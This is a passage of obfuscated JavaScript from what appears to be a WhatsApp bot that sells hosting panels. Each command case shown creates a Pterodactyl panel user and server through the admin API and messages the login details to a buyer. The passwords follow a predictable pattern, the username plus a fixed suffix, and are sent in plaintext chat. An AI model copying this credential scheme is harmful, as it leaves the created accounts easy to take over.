              'limits': _0x2a7213,
              'feature_limits': _0xc9cbe8,
              'deploy': {
                'locations': [parseInt(_0x48d984)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x31cff6 = await _0x467914[_0x597c(487)]();
          if (_0x31cff6.errors) {
            return _0x432e1b[_0x597c(395)](JSON.stringify(_0x31cff6[_0x597c(915)][0], null, 2));
          }
        }
        break;
      case "7gb":
        {
          if (!_0x403967 && !_0x18271c) {
            return _0x3652ad(mess[_0x597c(842)][_0x597c(456)]);
          }
          let _0x20f4c5 = _0x4d0552[_0x597c(613)](',');
          if (_0x20f4c5[_0x597c(625)] < 2) {
            return _0x432e1b[_0x597c(395)](_0x597c(988) + (_0x49f20b + _0x4af652) + " user,nomer");
          }
          let _0x5d1fb6 = _0x20f4c5[0];
          let _0x4dd9c7 = _0x432e1b[_0x597c(488)] ? _0x432e1b[_0x597c(488)].sender : _0x20f4c5[1] ? _0x20f4c5[1][_0x597c(729)](/[^0-9]/g, '') + _0x597c(981) : _0x432e1b[_0x597c(836)][0];
          let _0x4d0905 = _0x5d1fb6 + _0x597c(534);
          let _0xfbeda2 = global[_0x597c(886)];
          let _0x2ea563 = global[_0x597c(544)];
          let _0x34ec7b = _0x597c(738);
          let _0x3cceb7 = _0x597c(738);
          let _0x49bc10 = _0x5d1fb6 + _0x597c(589);
          akunlo = _0x597c(363);
          if (!_0x4dd9c7) {
            return;
          }
          let _0xbc775a = _0x5d1fb6 + "0011";
          let _0x2f8039 = await fetch(domain + _0x597c(722), {
            'method': "POST",
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': "Bearer " + apikey
            },
            'body': JSON[_0x597c(554)]({
              'email': _0x49bc10,
              'username': _0x5d1fb6,
              'first_name': _0x5d1fb6,
              'last_name': _0x5d1fb6,
              'language': 'en',
              'password': _0xbc775a
            })
          });
          let _0x5e0b97 = await _0x2f8039[_0x597c(487)]();
          if (_0x5e0b97.errors) {
            return _0x432e1b.rzxReply(JSON[_0x597c(554)](_0x5e0b97.errors[0], null, 2));
          }
          let _0x187c81 = _0x5e0b97.attributes;
          let _0x45bf50 = await fetch(domain + _0x597c(767) + _0xfbeda2, {
            'method': _0x597c(674),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': "application/json",
              'Authorization': _0x597c(792) + apikey
            }
          });
          const _0x564eaf = {
            url: akunlo
          };
          _0x432e1b[_0x597c(395)]("SUCCES CREATE USER ID: " + _0x187c81.id);
          ctf = _0x597c(854) + _0x4dd9c7[_0x597c(613)]`@`[0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x187c81[_0x597c(632)] + "\n⎙─➤ *🔐PASSWORD* : " + _0xbc775a + _0x597c(782) + domain + _0x597c(985);
          _0x5051a5[_0x597c(937)](_0x4dd9c7, {
            'image': _0x564eaf,
            'caption': ctf
          }, {
            'quoted': _0x5051a5[_0x597c(805)]
          });
          const _0x4a8d61 = {
            memory: _0x34ec7b,
            swap: 0x0,
            disk: _0x3cceb7,
            io: 0x1f4,
            cpu: "170"
          };
          const _0x54bd6c = {
            databases: 0x5,
            backups: 0x5,
            allocations: 0x1
          };
          let _0x5be024 = await _0x45bf50[_0x597c(487)]();
          let _0x176586 = _0x5be024[_0x597c(740)][_0x597c(807)];
          let _0x44c79b = await fetch(domain + _0x597c(474), {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': _0x597c(599),
              'Authorization': "Bearer " + apikey
            },
            'body': JSON[_0x597c(554)]({
              'name': _0x4d0905,
              'description': _0x597c(784),
              'user': _0x187c81.id,
              'egg': parseInt(_0xfbeda2),
              'docker_image': _0x597c(911),
              'startup': _0x176586,
              'environment': {
                'INST': _0x597c(521),
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': _0x597c(396)
              },
              'limits': _0x4a8d61,
              'feature_limits': _0x54bd6c,
              'deploy': {
                'locations': [parseInt(_0x2ea563)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x3afd1f = await _0x44c79b[_0x597c(487)]();
          if (_0x3afd1f[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON.stringify(_0x3afd1f[_0x597c(915)][0], null, 2));
          }
        }
        break;
      case _0x597c(677):
        {
          if (!_0x403967 && !_0x18271c) {
            return _0x3652ad(mess.only[_0x597c(456)]);
          }
          let _0x20b0ee = _0x4d0552[_0x597c(613)](',');
          if (_0x20b0ee[_0x597c(625)] < 2) {
            return _0x432e1b[_0x597c(395)](_0x597c(988) + (_0x49f20b + _0x4af652) + _0x597c(929));
          }
          let _0x2ece33 = _0x20b0ee[0];
          let _0x2d1972 = _0x432e1b[_0x597c(488)] ? _0x432e1b[_0x597c(488)][_0x597c(467)] : _0x20b0ee[1] ? _0x20b0ee[1][_0x597c(729)](/[^0-9]/g, '') + "@s.whatsapp.net" : _0x432e1b[_0x597c(836)][0];
          let _0x5b5ed2 = _0x2ece33 + _0x597c(883);
          let _0x1893fb = global[_0x597c(886)];
          let _0x555235 = global[_0x597c(544)];
          let _0x1e8003 = _0x597c(848);
          let _0xa46b04 = _0x2ece33 + _0x597c(589);
          akunlo = _0x597c(916);
          if (!_0x2d1972) {
            return;
          }
          let _0x4fb9b0 = _0x2ece33 + "0011";
          let _0x3612aa = await fetch(domain + _0x597c(722), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON.stringify({
              'email': _0xa46b04,
              'username': _0x2ece33,
              'first_name': _0x2ece33,
              'last_name': _0x2ece33,
              'language': 'en',
              'password': _0x4fb9b0
            })
          });
          let _0x71ab21 = await _0x3612aa[_0x597c(487)]();
          if (_0x71ab21[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x71ab21[_0x597c(915)][0], null, 2));
          }
          let _0x466ece = _0x71ab21[_0x597c(740)];
          let _0x52b94c = await fetch(domain + _0x597c(767) + _0x1893fb, {
            'method': 'GET',
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            }
          });
          const _0x487f52 = {
            url: akunlo
          };
          _0x432e1b[_0x597c(395)](_0x597c(346) + _0x466ece.id);
          ctf = _0x597c(854) + _0x2d1972[_0x597c(613)]`@`[0] + _0x597c(1006) + _0x466ece.username + _0x597c(652) + _0x4fb9b0 + _0x597c(782) + domain + _0x597c(985);
          _0x5051a5[_0x597c(937)](_0x2d1972, {
            'image': _0x487f52,
            'caption': ctf
          }, {
            'quoted': _0x5051a5[_0x597c(805)]
          });
          const _0xbafdbd = {
            memory: _0x1e8003,
            swap: 0x0,
            disk: "8192",
            io: 0x1f4,
            cpu: "200"
          };
          const _0x4e394b = {
            databases: 0x5,
            backups: 0x5,
            allocations: 0x1
          };
          let _0x5da41a = await _0x52b94c[_0x597c(487)]();
          let _0x279062 = _0x5da41a[_0x597c(740)].startup;
          let _0x5d1237 = await fetch(domain + _0x597c(474), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON.stringify({
              'name': _0x5b5ed2,
              'description': _0x597c(784),
              'user': _0x466ece.id,
              'egg': parseInt(_0x1893fb),
              'docker_image': _0x597c(911),
              'startup': _0x279062,
              'environment': {
                'INST': _0x597c(521),
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': _0xbafdbd,
              'feature_limits': _0x4e394b,
              'deploy': {
                'locations': [parseInt(_0x555235)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x615cf4 = await _0x5d1237[_0x597c(487)]();
          if (_0x615cf4.errors) {
            return _0x432e1b.rzxReply(JSON.stringify(_0x615cf4[_0x597c(915)][0], null, 2));
          }
        }
        break;
      case _0x597c(454):
        {
          if (!_0x403967 && !_0x18271c) {
            return _0x3652ad(mess.only.premium);
          }
          let _0x10c444 = _0x4d0552[_0x597c(613)](',');
          if (_0x10c444.length < 2) {
            return _0x432e1b[_0x597c(395)](_0x597c(988) + (_0x49f20b + _0x4af652) + _0x597c(929));
          }
          let _0x2a0be0 = _0x10c444[0];
          let _0x2ce47d = _0x432e1b[_0x597c(488)] ? _0x432e1b[_0x597c(488)][_0x597c(467)] : _0x10c444[1] ? _0x10c444[1].replace(/[^0-9]/g, '') + _0x597c(981) : _0x432e1b[_0x597c(836)][0];
          let _0x56435f = _0x2a0be0 + _0x597c(725);
          let _0x3794be = global[_0x597c(886)];
          let _0x37ae11 = global[_0x597c(544)];
          let _0x4177c4 = _0x597c(931);
          let _0xa4fd35 = _0x597c(620);
          let _0x54c21d = _0x597c(931);
          let _0x32db2b = _0x2a0be0 + _0x597c(589);
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x2ce47d) {
            return;
          }
          let _0x366778 = _0x2a0be0 + _0x597c(377);
          let _0x9ac42f = await fetch(domain + _0x597c(722), {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON[_0x597c(554)]({
              'email': _0x32db2b,
              'username': _0x2a0be0,
              'first_name': _0x2a0be0,
              'last_name': _0x2a0be0,
              'language': 'en',
              'password': _0x366778
            })
          });
          let _0xf9ec67 = await _0x9ac42f.json();
          if (_0xf9ec67[_0x597c(915)]) {
            return _0x432e1b.rzxReply(JSON[_0x597c(554)](_0xf9ec67[_0x597c(915)][0], null, 2));
          }
          let _0x6fc189 = _0xf9ec67.attributes;
          let _0x43f4a8 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x3794be, {
            'method': _0x597c(674),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': "Bearer " + apikey
            }
          });
          const _0xcef6f9 = {
            url: akunlo
          };
          _0x432e1b[_0x597c(395)](_0x597c(346) + _0x6fc189.id);
          ctf = _0x597c(854) + _0x2ce47d[_0x597c(613)]`@`[0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x6fc189.username + _0x597c(652) + _0x366778 + _0x597c(782) + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801\n=====================================\n";
          _0x5051a5[_0x597c(937)](_0x2ce47d, {
            'image': _0xcef6f9,
            'caption': ctf
          }, {
            'quoted': _0x5051a5[_0x597c(805)]
          });
          const _0x23b285 = {
            memory: _0x4177c4,
            swap: 0x0,
            disk: _0x54c21d,
            io: 0x1f4,
            cpu: _0xa4fd35
          };
          const _0x1ed5fb = {
            databases: 0x5,
            backups: 0x5,
            allocations: 0x1
          };
          let _0x328ad4 = await _0x43f4a8[_0x597c(487)]();
          let _0x3771b1 = _0x328ad4[_0x597c(740)][_0x597c(807)];
          let _0x4db67e = await fetch(domain + _0x597c(474), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON.stringify({
              'name': _0x56435f,
              'description': _0x597c(784),
              'user': _0x6fc189.id,
              'egg': parseInt(_0x3794be),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x3771b1,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': _0x597c(396)
              },
              'limits': _0x23b285,
              'feature_limits': _0x1ed5fb,
              'deploy': {
                'locations': [parseInt(_0x37ae11)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x5531a5 = await _0x4db67e.json();
          if (_0x5531a5.errors) {
            return _0x432e1b.rzxReply(JSON.stringify(_0x5531a5[_0x597c(915)][0], null, 2));
          }
        }
        break;
      case _0x597c(920):
        {
          if (!_0x403967 && !_0x18271c) {
            return _0x3652ad(mess.only[_0x597c(456)]);
          }
          let _0x48a9b1 = _0x4d0552.split(',');
          if (_0x48a9b1[_0x597c(625)] < 2) {
            return _0x432e1b[_0x597c(395)](_0x597c(988) + (_0x49f20b + _0x4af652) + _0x597c(929));
          }
          let _0x49e1eb = _0x48a9b1[0];
          let _0x4630f5 = _0x432e1b.quoted ? _0x432e1b[_0x597c(488)][_0x597c(467)] : _0x48a9b1[1] ? _0x48a9b1[1][_0x597c(729)](/[^0-9]/g, '') + _0x597c(981) : _0x432e1b.mentionedJid[0];
          let _0x39f467 = _0x49e1eb + _0x597c(592);
          let _0x340084 = global.eggsnya;
          let _0x122ea7 = global[_0x597c(544)];
          let _0x17c381 = _0x597c(480);
          let _0x443fec = _0x597c(480);
          let _0x5998f3 = _0x49e1eb + _0x597c(589);
          akunlo = _0x597c(916);
          if (!_0x4630f5) {
            return;
          }
          let _0x2cf005 = _0x49e1eb + _0x597c(377);
          let _0x821ede = await fetch(domain + _0x597c(722), {
            'method': "POST",
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': "application/json",
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON.stringify({
              'email': _0x5998f3,
              'username': _0x49e1eb,
              'first_name': _0x49e1eb,
              'last_name': _0x49e1eb,
              'language': 'en',
              'password': _0x2cf005
            })
          });
          let _0x1e2d9e = await _0x821ede[_0x597c(487)]();
          if (_0x1e2d9e.errors) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x1e2d9e[_0x597c(915)][0], null, 2));
          }
          let _0x203b44 = _0x1e2d9e.attributes;
          let _0x47477c = await fetch(domain + _0x597c(767) + _0x340084, {
            'method': _0x597c(674),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': "Bearer " + apikey
            }
          });
          const _0x7fc742 = {
            url: akunlo
          };
          _0x432e1b[_0x597c(395)](_0x597c(346) + _0x203b44.id);
          ctf = "Hai @" + _0x4630f5.split`@`[0] + _0x597c(1006) + _0x203b44.username + _0x597c(652) + _0x2cf005 + _0x597c(782) + domain + _0x597c(985);
          _0x5051a5[_0x597c(937)](_0x4630f5, {
            'image': _0x7fc742,
            'caption': ctf
          }, {
            'quoted': _0x5051a5[_0x597c(805)]
          });
          const _0x5e0235 = {
            memory: _0x17c381,
            swap: 0x0,
            disk: _0x443fec,
            io: 0x1f4,
            cpu: "250"
          };
          const _0x31aa82 = {
            databases: 0x5,
            backups: 0x5,
            allocations: 0x1
          };
          let _0x2ce74c = await _0x47477c[_0x597c(487)]();
          let _0x3e60f9 = _0x2ce74c[_0x597c(740)][_0x597c(807)];
          let _0x2d5286 = await fetch(domain + _0x597c(474), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': "Bearer " + apikey
            },
            'body': JSON[_0x597c(554)]({
              'name': _0x39f467,
              'description': _0x597c(784),
              'user': _0x203b44.id,
              'egg': parseInt(_0x340084),
              'docker_image': _0x597c(911),
              'startup': _0x3e60f9,
              'environment': {
                'INST': _0x597c(521),
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': _0x597c(396)
              },
              'limits': _0x5e0235,
              'feature_limits': _0x31aa82,
              'deploy': {
                'locations': [parseInt(_0x122ea7)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x3bfdc2 = await _0x2d5286[_0x597c(487)]();
          if (_0x3bfdc2[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x3bfdc2[_0x597c(915)][0], null, 2));
          }
        }
        break;
      case _0x597c(846):
        {
          if (!_0x403967 && !_0x18271c) {
            return _0x3652ad(mess[_0x597c(842)][_0x597c(456)]);
          }
          let _0x340a99 = _0x4d0552.split(',');
          if (_0x340a99[_0x597c(625)] < 2) {
            return _0x432e1b[_0x597c(395)](_0x597c(988) + (_0x49f20b + _0x4af652) + _0x597c(929));
          }
          let _0x53284d = _0x340a99[0];
          let _0x329ec6 = _0x432e1b[_0x597c(488)] ? _0x432e1b[_0x597c(488)][_0x597c(467)] : _0x340a99[1] ? _0x340a99[1][_0x597c(729)](/[^0-9]/g, '') + _0x597c(981) : _0x432e1b[_0x597c(836)][0];
          let _0x2e9219 = _0x53284d + _0x597c(626);
          let _0x1ef5cc = global[_0x597c(886)];
          let _0x6efc73 = global[_0x597c(544)];
          let _0x53894a = _0x597c(662);
          let _0x345821 = _0x597c(552);
          let _0x4a8d10 = _0x597c(662);
          let _0x52e821 = _0x53284d + "1398@gmail.com";
          akunlo = _0x597c(916);
          if (!_0x329ec6) {
            return;
          }
          let _0x3b04cc = _0x53284d + _0x597c(377);
          let _0x452972 = await fetch(domain + _0x597c(722), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON[_0x597c(554)]({
              'email': _0x52e821,
              'username': _0x53284d,
              'first_name': _0x53284d,
              'last_name': _0x53284d,
              'language': 'en',
              'password': _0x3b04cc
            })
          });
          let _0x3e2756 = await _0x452972[_0x597c(487)]();
          if (_0x3e2756[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x3e2756[_0x597c(915)][0], null, 2));
          }
          let _0x20eedc = _0x3e2756.attributes;
          let _0x487c61 = await fetch(domain + _0x597c(767) + _0x1ef5cc, {
            'method': _0x597c(674),
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          const _0x121ed0 = {
            url: akunlo
          };
          _0x432e1b[_0x597c(395)](_0x597c(346) + _0x20eedc.id);
          ctf = _0x597c(854) + _0x329ec6[_0x597c(613)]`@`[0] + _0x597c(1006) + _0x20eedc[_0x597c(632)] + _0x597c(652) + _0x3b04cc + _0x597c(782) + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801\n=====================================\n";
          _0x5051a5[_0x597c(937)](_0x329ec6, {
            'image': _0x121ed0,
            'caption': ctf
          }, {
            'quoted': _0x5051a5[_0x597c(805)]
          });
          const _0x808af4 = {
            memory: _0x53894a,
            swap: 0x0,
            disk: _0x4a8d10,
            io: 0x1f4,
            cpu: _0x345821
          };
          const _0x14c70f = {
            databases: 0x5,
            backups: 0x5,
            allocations: 0x1
          };
          let _0x2432cb = await _0x487c61[_0x597c(487)]();
          let _0x31cf08 = _0x2432cb[_0x597c(740)][_0x597c(807)];
          let _0x2b2348 = await fetch(domain + _0x597c(474), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON[_0x597c(554)]({
              'name': _0x2e9219,
              'description': _0x597c(784),
              'user': _0x20eedc.id,
              'egg': parseInt(_0x1ef5cc),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x31cf08,
              'environment': {
                'INST': _0x597c(521),
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': _0x808af4,
              'feature_limits': _0x14c70f,
              'deploy': {
                'locations': [parseInt(_0x6efc73)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x4851f7 = await _0x2b2348[_0x597c(487)]();
          if (_0x4851f7[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x4851f7[_0x597c(915)][0], null, 2));
          }
        }
        break;
      case _0x597c(370):
        {
          if (!_0x403967 && !_0x18271c) {
            return _0x3652ad(mess.only[_0x597c(456)]);
          }
          let _0x54a902 = _0x4d0552[_0x597c(613)](',');
          if (_0x54a902[_0x597c(625)] < 2) {
            return _0x432e1b.rzxReply("*Format salah!*\nPenggunaan:\n" + (_0x49f20b + _0x4af652) + _0x597c(929));
          }
          let _0x1606bc = _0x54a902[0];
          let _0x5ebc55 = _0x432e1b[_0x597c(488)] ? _0x432e1b.quoted[_0x597c(467)] : _0x54a902[1] ? _0x54a902[1].replace(/[^0-9]/g, '') + _0x597c(981) : _0x432e1b[_0x597c(836)][0];
          let _0x2b863e = _0x1606bc + _0x597c(852);
          let _0x4dc480 = global[_0x597c(886)];
          let _0x8fc5d0 = global[_0x597c(544)];
          let _0x20d33e = _0x597c(953);
          let _0x284bfa = _0x597c(444);
          let _0x2b2c06 = _0x597c(953);
          let _0x8f2477 = _0x1606bc + "1398@gmail.com";
          akunlo = _0x597c(916);
          if (!_0x5ebc55) {
            return;
          }
          let _0x443254 = _0x1606bc + _0x597c(377);
          let _0xa055db = await fetch(domain + _0x597c(722), {
            'method': "POST",
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': "Bearer " + apikey
            },
            'body': JSON[_0x597c(554)]({
              'email': _0x8f2477,
              'username': _0x1606bc,
              'first_name': _0x1606bc,
              'last_name': _0x1606bc,
              'language': 'en',
              'password': _0x443254
            })
          });
          let _0x5b054f = await _0xa055db[_0x597c(487)]();
          if (_0x5b054f[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x5b054f[_0x597c(915)][0], null, 2));
          }
          let _0x1e4888 = _0x5b054f[_0x597c(740)];
          let _0x19d7c9 = await fetch(domain + _0x597c(767) + _0x4dc480, {
            'method': _0x597c(674),
            'headers': {
              'Accept': "application/json",
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            }
          });
          const _0x46d822 = {
            url: akunlo
          };
          _0x432e1b[_0x597c(395)](_0x597c(346) + _0x1e4888.id);
          ctf = "Hai @" + _0x5ebc55[_0x597c(613)]`@`[0] + _0x597c(1006) + _0x1e4888[_0x597c(632)] + _0x597c(652) + _0x443254 + _0x597c(782) + domain + _0x597c(985);
          _0x5051a5.sendMessage(_0x5ebc55, {
            'image': _0x46d822,
            'caption': ctf
          }, {
            'quoted': _0x5051a5[_0x597c(805)]
          });
          const _0x46c248 = {
            memory: _0x20d33e,
            swap: 0x0,
            disk: _0x2b2c06,
            io: 0x1f4,
            cpu: _0x284bfa
          };
          const _0x52f42b = {
            databases: 0x5,
            backups: 0x5,
            allocations: 0x1
          };
          let _0x6a98e8 = await _0x19d7c9[_0x597c(487)]();
          let _0x54af6e = _0x6a98e8[_0x597c(740)].startup;
          let _0x562884 = await fetch(domain + _0x597c(474), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': "application/json",
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON[_0x597c(554)]({
              'name': _0x2b863e,
              'description': _0x597c(784),
              'user': _0x1e4888.id,
              'egg': parseInt(_0x4dc480),
              'docker_image': _0x597c(911),
              'startup': _0x54af6e,
              'environment': {
                'INST': _0x597c(521),
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': _0x46c248,
              'feature_limits': _0x52f42b,
              'deploy': {
                'locations': [parseInt(_0x8fc5d0)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x5bcc2f = await _0x562884[_0x597c(487)]();
          if (_0x5bcc2f[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x5bcc2f[_0x597c(915)][0], null, 2));
          }
        }
        break;
      case _0x597c(1000):
        {
          if (!_0x403967 && !_0x18271c) {
            return _0x3652ad(mess[_0x597c(842)][_0x597c(456)]);
          }
          let _0x5bfd68 = _0x4d0552[_0x597c(613)](',');
          if (_0x5bfd68[_0x597c(625)] < 2) {
            return _0x432e1b[_0x597c(395)](_0x597c(988) + (_0x49f20b + _0x4af652) + _0x597c(929));
          }
          let _0x23b81a = _0x5bfd68[0];
          let _0x4cf820 = _0x432e1b[_0x597c(488)] ? _0x432e1b[_0x597c(488)][_0x597c(467)] : _0x5bfd68[1] ? _0x5bfd68[1][_0x597c(729)](/[^0-9]/g, '') + _0x597c(981) : _0x432e1b[_0x597c(836)][0];
          let _0x329d25 = _0x23b81a + '24GB';
          let _0x348e44 = global[_0x597c(886)];
          let _0x253a8b = global.location;
          let _0x504442 = _0x597c(465);
          let _0x26f85a = _0x23b81a + _0x597c(589);
          akunlo = _0x597c(916);
          if (!_0x4cf820) {
            return;
          }
          let _0x4fa2d2 = _0x23b81a + "0011";
          let _0x479b06 = await fetch(domain + _0x597c(722), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': "application/json",
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON[_0x597c(554)]({
              'email': _0x26f85a,
              'username': _0x23b81a,
              'first_name': _0x23b81a,
              'last_name': _0x23b81a,
              'language': 'en',
              'password': _0x4fa2d2
            })
          });
          let _0x27334d = await _0x479b06[_0x597c(487)]();
          if (_0x27334d[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x27334d.errors[0], null, 2));
          }
          let _0x292921 = _0x27334d.attributes;
          let _0x2400e4 = await fetch(domain + _0x597c(767) + _0x348e44, {
            'method': _0x597c(674),
            'headers': {
              'Accept': "application/json",
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            }
          });
          const _0x2498c0 = {
            url: akunlo
          };
          _0x432e1b[_0x597c(395)]("SUCCES CREATE USER ID: " + _0x292921.id);
          ctf = _0x597c(854) + _0x4cf820[_0x597c(613)]`@`[0] + _0x597c(1006) + _0x292921[_0x597c(632)] + _0x597c(652) + _0x4fa2d2 + _0x597c(782) + domain + _0x597c(985);
          _0x5051a5[_0x597c(937)](_0x4cf820, {
            'image': _0x2498c0,
            'caption': ctf
          }, {
            'quoted': _0x5051a5[_0x597c(805)]
          });
          const _0xc169fd = {
            memory: _0x504442,
            swap: 0x0,
            disk: "24240",
            io: 0x1f4,
            cpu: "660"
          };
          const _0x2b0752 = {
            databases: 0x5,
            backups: 0x5,
            allocations: 0x1
          };
          let _0x2420cc = await _0x2400e4.json();
          let _0x5d70f4 = _0x2420cc.attributes[_0x597c(807)];
          let _0x1a9a15 = await fetch(domain + _0x597c(474), {
            'method': "POST",
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': "Bearer " + apikey
            },
            'body': JSON[_0x597c(554)]({
              'name': _0x329d25,
              'description': "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x292921.id,
              'egg': parseInt(_0x348e44),
              'docker_image': _0x597c(911),
              'startup': _0x5d70f4,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': _0x597c(396)
              },
              'limits': _0xc169fd,
              'feature_limits': _0x2b0752,
              'deploy': {
                'locations': [parseInt(_0x253a8b)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x157702 = await _0x1a9a15[_0x597c(487)]();
          if (_0x157702[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x157702[_0x597c(915)][0], null, 2));
          }
        }
        break;
      case _0x597c(659):
        {
          if (!_0x403967 && !_0x18271c) {
            return _0x3652ad(mess[_0x597c(842)][_0x597c(456)]);
          }
          let _0x3fe975 = _0x4d0552[_0x597c(613)](',');
          if (_0x3fe975[_0x597c(625)] < 2) {
            return _0x432e1b[_0x597c(395)](_0x597c(988) + (_0x49f20b + _0x4af652) + _0x597c(929));
          }
          let _0x1d67a5 = _0x3fe975[0];
